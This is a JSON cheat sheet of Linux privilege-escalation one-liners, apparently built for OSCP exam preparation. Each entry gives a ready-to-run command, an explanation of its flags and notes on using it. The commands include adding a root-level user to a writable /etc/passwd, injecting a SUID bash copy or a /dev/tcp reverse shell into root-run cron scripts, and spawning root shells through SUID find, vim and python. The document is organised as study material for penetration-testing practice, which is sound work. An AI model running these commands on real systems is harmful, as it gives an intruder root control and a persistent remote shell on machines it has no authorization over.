{
  "category": "post-exploit",
  "subcategory": "linux-privesc-oneliners",
  "description": "Essential Linux privilege escalation one-liners for rapid OSCP enumeration and exploitation",
  "commands": [
    {
      "id": "linux-flag-finder",
      "name": "OSCP Flag Finder",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "result=$(find / -type f -regex \".*\\(flag\\|proof\\)\\.txt\" 2>/dev/null); [ -n \"$result\" ] && echo \"$result\" || grep -rlE \"OS\\{[a-fA-F0-9]{32}\\}\" / 2>/dev/null",
      "description": "Find flag.txt or proof.txt files, fallback to searching for OS{hash} pattern if not found",
      "variables": [],
      "flag_explanations": {
        "result=$(...)": "Command substitution - stores find output in variable for conditional logic",
        "-type f": "Only match regular files (not directories)",
        "-regex": "Use regex pattern matching on full path",
        ".*\\(flag\\|proof\\)\\.txt": "Match paths ending in flag.txt OR proof.txt",
        "2>/dev/null": "Suppress permission denied errors",
        "[ -n \"$result\" ]": "Test if result string is non-empty",
        "&&": "Execute next command only if previous succeeded (result found)",
        "||": "Execute next command only if previous failed (no result)",
        "grep -rlE": "Recursive (-r), list files only (-l), extended regex (-E)",
        "OS\\{[a-fA-F0-9]{32}\\}": "Match OS{ followed by 32 hex chars and } (OSCP flag format)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "FLAG_CAPTURE",
        "POST_EXPLOITATION",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Path to flag.txt or proof.txt displayed",
        "/root/proof.txt",
        "/home/user/local.txt",
        "File path containing OS{hash} pattern"
      ],
      "failure_indicators": [
        "No output (flags not found)",
        "Permission denied on all paths",
        "find: command not found"
      ],
      "next_steps": [
        "verify-root-access-suid"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "No output": "Flags may be in non-standard location. Try: find / -name '*.txt' -exec grep -l 'OS{' {} \\; 2>/dev/null",
        "Too slow": "Search specific directories first: find /root /home -name '*flag*' -o -name '*proof*' 2>/dev/null"
      },
      "notes": "OSCP exam flags are typically in:\n- /root/proof.txt (after root privesc)\n- /home/user/local.txt (after initial foothold)\n\nFlag format: OS{32-character-hex-hash}\n\nTime estimate: 5-30 seconds depending on filesystem size.\n\nAlways screenshot the flag AND the id/whoami output together for proof."
    },
    {
      "id": "linux-passwd-privesc",
      "name": "Writable /etc/passwd Privesc",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "U=\"root2\" P=\"w00t\"; [ -w /etc/passwd ] && ! grep -q \"^$U:\" /etc/passwd && echo \"$U:$(openssl passwd $P):0:0:root:/root:/bin/bash\" >> /etc/passwd && su $U",
      "description": "Exploit writable /etc/passwd by adding new root user with known password",
      "variables": [],
      "flag_explanations": {
        "U=\"root2\" P=\"w00t\"": "Set variables for username and password (customize as needed)",
        "[ -w /etc/passwd ]": "Test if /etc/passwd is writable by current user",
        "! grep -q \"^$U:\"": "Check user doesn't already exist (! inverts, -q quiet mode)",
        "$(openssl passwd $P)": "Generate DES password hash inline (avoids copy/paste errors)",
        "0:0": "UID:GID of 0 = root privileges",
        "root:/root:/bin/bash": "GECOS field, home directory, login shell",
        ">> /etc/passwd": "Append to passwd file (don't overwrite!)",
        "su $U": "Switch to new user (will prompt for password)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "PRIVILEGE_ESCALATION",
        "PASSWD",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "No error from echo command",
        "su prompts for password",
        "After entering password, shell shows # or root prompt",
        "whoami returns 'root'"
      ],
      "failure_indicators": [
        "Permission denied on /etc/passwd",
        "User already exists (grep found match)",
        "su: Authentication failure (password hash issue)",
        "openssl: command not found"
      ],
      "next_steps": [
        "linux-flag-finder",
        "verify-root-access-suid"
      ],
      "alternatives": [
        "execute-suid-exploit-find"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Permission denied": "/etc/passwd is not writable. Check: ls -la /etc/passwd (need -rw-r--rw- or similar)",
        "Authentication failure": "Password hash mismatch. Use command substitution $(openssl passwd $P) to avoid typos",
        "openssl not found": "Alternative: Use python: python -c \"import crypt; print(crypt.crypt('w00t'))\"",
        "User exists": "Change U variable to different username: U='pwned'"
      },
      "notes": "Writable /etc/passwd is a classic misconfiguration.\n\nThe passwd file format:\nusername:password_hash:UID:GID:GECOS:home:shell\n\nUID and GID of 0 grants root privileges regardless of username.\n\nManual alternative (if openssl unavailable):\n1. On attacker: openssl passwd mypassword\n2. Copy hash\n3. On target: echo 'root2:HASH:0:0::/root:/bin/bash' >> /etc/passwd\n\nTime estimate: 30 seconds if writable, instant fail if not."
    },
    {
      "id": "linux-quick-privesc-enum",
      "name": "Quick Privesc Enumeration",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "echo \"=== SUID ===\" && find / -perm -4000 -type f 2>/dev/null && echo -e \"\\n=== SGID ===\" && find / -perm -2000 -type f 2>/dev/null && echo -e \"\\n=== CAPABILITIES ===\" && getcap -r / 2>/dev/null",
      "description": "Rapid enumeration of SUID binaries, SGID binaries, and Linux capabilities",
      "variables": [],
      "flag_explanations": {
        "echo \"=== SUID ===\"": "Section header for readability",
        "-perm -4000": "Find files with SUID bit set (4 in octal = setuid)",
        "-perm -2000": "Find files with SGID bit set (2 in octal = setgid)",
        "-type f": "Only regular files (not directories)",
        "2>/dev/null": "Suppress permission denied errors",
        "echo -e \"\\n\"": "Print newline for spacing between sections (-e enables escape sequences)",
        "getcap -r /": "Recursively list files with capabilities from root"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "ENUMERATION",
        "PRIVILEGE_ESCALATION",
        "SUID",
        "CAPABILITIES"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "List of SUID binaries displayed",
        "List of SGID binaries displayed",
        "Capabilities list (may be empty on hardened systems)",
        "Non-standard binaries in SUID list (find, vim, python, etc.)"
      ],
      "failure_indicators": [
        "Empty output for all sections",
        "find: command not found",
        "getcap: command not found"
      ],
      "next_steps": [
        "linux-gtfobins-suid-filter",
        "gtfobins-suid-lookup"
      ],
      "alternatives": [
        "find-suid-binaries"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "getcap not found": "Skip capabilities or use: find / -type f -exec getcap {} \\; 2>/dev/null",
        "Too much output": "Pipe to less: command | less",
        "Need to save output": "Redirect: command > /tmp/privesc_enum.txt"
      },
      "notes": "This is the FIRST command to run after gaining shell access.\n\nSUID: Binary runs with owner's privileges (usually root)\nSGID: Binary runs with group's privileges\nCapabilities: Fine-grained root-like permissions (cap_setuid is dangerous)\n\nTime estimate: 10-60 seconds depending on filesystem size.\n\nDangerous capabilities to look for:\n- cap_setuid: Can become root\n- cap_dac_override: Bypass file permissions\n- cap_sys_admin: Almost everything"
    },
    {
      "id": "linux-full-privesc-check",
      "name": "Full Privesc Check",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "echo \"[*] SUID binaries owned by root:\" && find / -perm -4000 -user root -type f 2>/dev/null && echo -e \"\\n[*] Capabilities:\" && getcap -r / 2>/dev/null && echo -e \"\\n[*] Writable /etc/passwd?\" && [ -w /etc/passwd ] && echo \"YES - VULNERABLE\" || echo \"No\" && echo -e \"\\n[*] Sudo permissions:\" && sudo -l 2>/dev/null",
      "description": "Comprehensive privilege escalation check including SUID, capabilities, writable passwd, and sudo",
      "variables": [],
      "flag_explanations": {
        "-user root": "Only SUID binaries owned by root (most useful for privesc)",
        "[ -w /etc/passwd ]": "Test if passwd file is writable",
        "sudo -l": "List sudo permissions for current user (may require password)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "ENUMERATION",
        "PRIVILEGE_ESCALATION",
        "COMPREHENSIVE"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Complete output for all sections",
        "YES - VULNERABLE for writable passwd",
        "sudo -l shows (ALL) NOPASSWD entries",
        "Unusual SUID binaries identified"
      ],
      "failure_indicators": [
        "Empty sections",
        "sudo: command not found",
        "sudo requires password and fails"
      ],
      "next_steps": [
        "linux-passwd-privesc",
        "linux-gtfobins-suid-filter"
      ],
      "alternatives": [
        "linux-quick-privesc-enum"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "sudo -l hangs": "Ctrl+C to cancel, may require password. Try: timeout 5 sudo -l 2>/dev/null",
        "Output too long": "Run each section separately for better analysis"
      },
      "notes": "More comprehensive than quick enum, but takes slightly longer.\n\nPriority order for exploitation:\n1. Writable /etc/passwd (instant root)\n2. sudo NOPASSWD (easy exploitation via GTFOBins)\n3. Dangerous capabilities (cap_setuid)\n4. SUID binaries (check GTFOBins)\n\nTime estimate: 30-90 seconds."
    },
    {
      "id": "linux-gtfobins-suid-filter",
      "name": "GTFOBins-Aware SUID Check",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "GTFO=\"find|vim|nmap|python|perl|ruby|bash|less|more|cp|mv|tar|awk|env|ftp|git|docker|php|node|lua\"; find / -perm -4000 -type f 2>/dev/null | grep -E \"($GTFO)\"",
      "description": "Find SUID binaries and filter to show only those known to be exploitable via GTFOBins",
      "variables": [],
      "flag_explanations": {
        "GTFO=\"...\"": "Variable containing known exploitable binary names",
        "|": "Pipe character used as regex OR separator",
        "grep -E": "Extended regex mode for alternation patterns",
        "($GTFO)": "Capture group containing the binary list"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "SUID",
        "GTFOBINS",
        "FILTER",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "One or more known exploitable binaries found",
        "/usr/bin/find",
        "/usr/bin/vim",
        "/usr/bin/python"
      ],
      "failure_indicators": [
        "Empty output (no exploitable SUID found)",
        "grep: command not found"
      ],
      "next_steps": [
        "gtfobins-suid-lookup",
        "execute-suid-exploit-find"
      ],
      "alternatives": [
        "filter-suid-binaries"
      ],
      "prerequisites": [
        "linux-quick-privesc-enum"
      ],
      "troubleshooting": {
        "Empty output": "System may be hardened. Check full SUID list manually for custom binaries",
        "Add more binaries": "Extend GTFO variable: GTFO=\"$GTFO|newbinary|another\""
      },
      "notes": "Pre-filters SUID output to show only known-exploitable binaries.\n\nIf a binary appears, immediately check GTFOBins:\nhttps://gtfobins.github.io/\n\nSearch for the binary name and look for 'SUID' section.\n\nCommon instant wins:\n- find: find . -exec /bin/bash -p \\; -quit\n- vim: vim -c ':!/bin/bash -p'\n- python: python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'\n\nTime estimate: 10-30 seconds."
    },
    {
      "id": "linux-suid-auto-research",
      "name": "SUID Binary Auto-Research",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "for bin in $(find / -perm -4000 -type f 2>/dev/null | xargs -I {} basename {}); do echo \"=== $bin ===\"; searchsploit $bin 2>/dev/null | head -5; done",
      "description": "Automatically search for exploits for each SUID binary using searchsploit",
      "variables": [],
      "flag_explanations": {
        "for bin in $(...)": "Loop through each binary found",
        "xargs -I {} basename {}": "Extract just the filename from full path",
        "echo \"=== $bin ===\"": "Print header for each binary",
        "searchsploit $bin": "Search exploit-db for binary name",
        "head -5": "Limit to first 5 results per binary"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:MEDIUM",
        "LINUX",
        "SUID",
        "RESEARCH",
        "SEARCHSPLOIT",
        "AUTOMATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Exploit entries found for binaries",
        "Multiple searchsploit matches",
        "Privilege escalation exploits listed"
      ],
      "failure_indicators": [
        "No exploits found (all empty)",
        "searchsploit: command not found",
        "Takes too long (many binaries)"
      ],
      "next_steps": [
        "gtfobins-suid-lookup"
      ],
      "alternatives": [],
      "prerequisites": [
        "find-suid-binaries"
      ],
      "troubleshooting": {
        "searchsploit not found": "Run on Kali, not target. Note SUID list and research on attack machine",
        "Too slow": "Run filtered version instead using linux-gtfobins-suid-filter first",
        "Too much output": "Redirect to file: command > suid_research.txt"
      },
      "notes": "Best run on ATTACK MACHINE (Kali) not target.\n\nWorkflow:\n1. On target: find / -perm -4000 -type f 2>/dev/null > /tmp/suid.txt\n2. Transfer suid.txt to Kali\n3. On Kali: Run this command\n\nNote: searchsploit may return false positives (same name, different software).\nAlways verify exploit applicability.\n\nTime estimate: 30-120 seconds depending on number of SUID binaries."
    },
    {
      "id": "linux-cron-enum",
      "name": "Cron Job Enumeration",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null",
      "description": "Enumerate all system and user cron jobs for potential privilege escalation",
      "variables": [],
      "flag_explanations": {
        "/etc/crontab": "System-wide crontab with user field",
        "/etc/cron.*": "Matches cron.d, cron.daily, cron.hourly, cron.weekly, cron.monthly",
        "ls -la": "List with permissions to check writability",
        "/var/spool/cron/crontabs/*": "User crontabs (alternative: /var/spool/cron/*)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "CRON",
        "ENUMERATION",
        "PRIVILEGE_ESCALATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Crontab contents displayed",
        "Cron directories listed with permissions",
        "Scripts running as root identified",
        "Writable cron scripts found (rw for others)"
      ],
      "failure_indicators": [
        "Permission denied on all files",
        "Empty crontab",
        "No cron directories found"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Permission denied on user crontabs": "Normal for unprivileged user. Focus on /etc/crontab and /etc/cron.d/",
        "Can't see cron execution": "Use pspy to monitor process creation: ./pspy64"
      },
      "notes": "Cron privesc vectors:\n\n1. WRITABLE SCRIPT: If cron runs a script you can write to, inject reverse shell\n2. RELATIVE PATH: If script uses 'backup.sh' not '/usr/bin/backup.sh', PATH hijacking\n3. WILDCARD INJECTION: If script uses tar/rsync with *, exploit via malicious filenames\n4. MISSING SCRIPT: If cron references non-existent file you can create, create it\n\nCron format:\nmin hour day month weekday user command\n\nTime estimate: 5-10 seconds."
    },
    {
      "id": "linux-suid-vuln-check",
      "name": "SUID Vulnerability Check",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "ls -la $(which find) | grep -q 'rws' && echo \"VULNERABLE\" || echo \"NOT VULNERABLE\"",
      "description": "Quick check if a specific binary (find) has SUID bit set for exploitation",
      "variables": [],
      "flag_explanations": {
        "$(which find)": "Command substitution to get full path of binary",
        "ls -la": "Long listing with permissions",
        "grep -q 'rws'": "Quiet grep for SUID pattern (r=read, w=write, s=suid+execute)",
        "&&": "Run next command if grep succeeds (pattern found)",
        "||": "Run next command if grep fails (pattern not found)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "SUID",
        "VERIFICATION",
        "QUICK_CHECK"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "VULNERABLE output",
        "Binary has 's' in permission string"
      ],
      "failure_indicators": [
        "NOT VULNERABLE output",
        "which: command not found",
        "Binary doesn't exist"
      ],
      "next_steps": [
        "execute-suid-exploit-find"
      ],
      "alternatives": [
        "find-suid-binaries"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Check different binary": "Replace 'find' with target binary: ls -la $(which vim) | grep -q 'rws'",
        "which not available": "Use full path: ls -la /usr/bin/find | grep -q 'rws'"
      },
      "notes": "Quick targeted check for specific binary SUID status.\n\nPermission string interpretation:\n- rwsr-xr-x = SUID set (lowercase s = execute + suid)\n- rwSr-xr-x = SUID set but no execute (uppercase S, broken)\n- rwxr-xr-x = No SUID (normal execute)\n\nModify 'find' to check any binary:\n- vim: ls -la $(which vim) | grep -q 'rws'\n- python: ls -la $(which python) | grep -q 'rws'\n- nmap: ls -la $(which nmap) | grep -q 'rws'\n\nTime estimate: < 1 second."
    },
    {
      "id": "linux-cron-hijack-suid",
      "name": "Cron Job Hijack - SUID Bash",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> <WRITABLE_SCRIPT> && sleep 65 && /tmp/rootbash -p",
      "description": "Inject SUID bash payload into writable cron script, wait for execution, then spawn root shell",
      "variables": [
        {
          "name": "<WRITABLE_SCRIPT>",
          "description": "Path to script that cron runs as root and you can write to",
          "example": "/var/archives/archive.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "cp /bin/bash /tmp/rootbash": "Copy bash binary to writable location (cron runs as root so copy preserves ownership)",
        "chmod +s": "Set SUID bit so binary runs with owner privileges (root)",
        ">>": "Append to file (don't overwrite existing script content)",
        "sleep 65": "Wait for cron to execute (most cron jobs run every minute)",
        "/tmp/rootbash -p": "Execute SUID bash with -p flag to preserve effective UID (euid=0)",
        "-p": "CRITICAL: Prevents bash from dropping privileges to real UID"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "PRIVILEGE_ESCALATION",
        "CRON",
        "SUID",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "No error from echo command",
        "/tmp/rootbash appears after waiting",
        "ls -la /tmp/rootbash shows -rwsr-sr-x",
        "After running rootbash -p: whoami returns root or id shows euid=0"
      ],
      "failure_indicators": [
        "Permission denied on script file",
        "/tmp/rootbash not created after waiting",
        "rootbash created but no SUID bit (runs as user)",
        "bash-5.0$ prompt instead of bash-5.0# (missing -p flag)"
      ],
      "next_steps": [
        "linux-flag-finder"
      ],
      "alternatives": [
        "linux-cron-hijack-revshell"
      ],
      "prerequisites": [
        "linux-cron-enum"
      ],
      "troubleshooting": {
        "SUID bit not set": "Cron not running as root. Check crontab user field: cat /etc/crontab",
        "File not created": "Cron may run less frequently. Check schedule and wait longer",
        "Permission denied on /tmp": "Try /dev/shm or /var/tmp instead: cp /bin/bash /dev/shm/rootbash",
        "euid stays 1000": "Forgot -p flag! Must use /tmp/rootbash -p not just /tmp/rootbash"
      },
      "notes": "BEST privesc method when kernel exploits fail due to GLIBC mismatch or no GCC.\n\nDiscovery workflow:\n1. Run linux-cron-enum to find cron jobs\n2. Check for writable scripts: find / -writable -type f 2>/dev/null | xargs grep -l '/etc/cron\\|crontab'\n3. Or look for writable paths in cron output\n\nWhy -p flag is critical:\n- Bash normally drops privileges to real UID for security\n- -p preserves effective UID (euid=0 from SUID)\n- Without -p: uid=1000, euid=1000 (dropped)\n- With -p: uid=1000, euid=0 (ROOT!)\n\nTime estimate: 1-2 minutes (mostly waiting for cron).\n\nOSCP exam note: This works when compiled kernel exploits fail (GLIBC mismatch, no compiler).",
      "filled_example": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/archives/archive.sh && sleep 65 && /tmp/rootbash -p"
    },
    {
      "id": "linux-cron-hijack-revshell",
      "name": "Cron Job Hijack - Reverse Shell",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> <WRITABLE_SCRIPT>",
      "description": "Inject reverse shell into writable cron script for root shell callback",
      "variables": [
        {
          "name": "<WRITABLE_SCRIPT>",
          "description": "Path to script that cron runs as root",
          "example": "/opt/scripts/backup.sh",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for callback",
          "example": "192.168.45.204",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port for callback",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "bash -i": "Interactive bash shell",
        ">& /dev/tcp/": "Redirect stdout and stderr to TCP connection",
        "0>&1": "Redirect stdin to same connection (full duplex shell)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "PRIVILEGE_ESCALATION",
        "CRON",
        "REVERSE_SHELL"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Reverse shell connects as root",
        "id shows uid=0(root)"
      ],
      "failure_indicators": [
        "No callback received",
        "Callback as non-root user"
      ],
      "next_steps": [
        "linux-flag-finder"
      ],
      "alternatives": [
        "linux-cron-hijack-suid"
      ],
      "prerequisites": [
        "linux-cron-enum"
      ],
      "troubleshooting": {
        "No callback": "Check firewall rules, verify cron is running, try different port",
        "Callback as user": "Cron not running as root, check crontab user field"
      },
      "notes": "Alternative to SUID method when you want immediate shell.\n\nSetup listener first: nc -lvnp 4444\n\nAdvantage over SUID method: Immediate full interactive shell\nDisadvantage: Requires network connectivity to attacker\n\nTime estimate: 1-2 minutes (waiting for cron).",
      "filled_example": "echo 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' >> /opt/scripts/backup.sh"
    },
    {
      "id": "linux-suid-find-shell",
      "name": "SUID Find - Root Shell",
      "category": "post-exploit",
      "subcategory": "linux-privesc-oneliners",
      "command": "find / -exec /bin/bash -p \\; -quit",
      "description": "Spawn root shell via SUID find binary using -exec flag",
      "variables": [],
      "flag_explanations": {
        "find /": "Search from root (any valid path works, / is conventional)",
        "-exec": "Execute command for each match (or just once with -quit)",
        "/bin/bash -p": "Spawn bash preserving effective UID (euid=0)",
        "\\;": "Terminate -exec command (escaped semicolon)",
        "-quit": "Exit after first execution (prevents spawning multiple shells)"
      },
      "tags": [
        "ONE_LINER",
        "OSCP:HIGH",
        "LINUX",
        "PRIVILEGE_ESCALATION",
        "SUID",
        "GTFOBINS",
        "INSTANT_ROOT"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Shell prompt changes to # or bash-5.0#",
        "id shows euid=0(root)",
        "whoami returns root"
      ],
      "failure_indicators": [
        "find: command not found",
        "Shell stays as user (find not SUID)",
        "Permission denied on -exec"
      ],
      "next_steps": [
        "linux-flag-finder"
      ],
      "alternatives": [],
      "prerequisites": [
        "linux-gtfobins-suid-filter"
      ],
      "troubleshooting": {
        "Still user shell": "Verify find is SUID: ls -la $(which find) - must show 's' in permissions",
        "-quit not supported": "Remove -quit flag, press Ctrl+C after shell spawns",
        "bash -p not working": "Try sh instead: find / -exec /bin/sh -p \\; -quit"
      },
      "notes": "INSTANT root shell if find has SUID bit.\n\nVerify SUID first: ls -la $(which find)\nShould show: -rwsr-xr-x ... /usr/bin/find\n\nThe 's' in the owner execute position means SUID is set.\n\nWhy this works:\n1. find runs as root (SUID)\n2. -exec runs command as the find process owner (root)\n3. bash -p preserves euid=0\n4. Result: root shell\n\nGTFOBins reference: https://gtfobins.github.io/gtfobins/find/\n\nTime estimate: < 1 second (instant).\n\nOSCP exam: Most reliable SUID exploitation - memorize this command!"
    }
  ]
}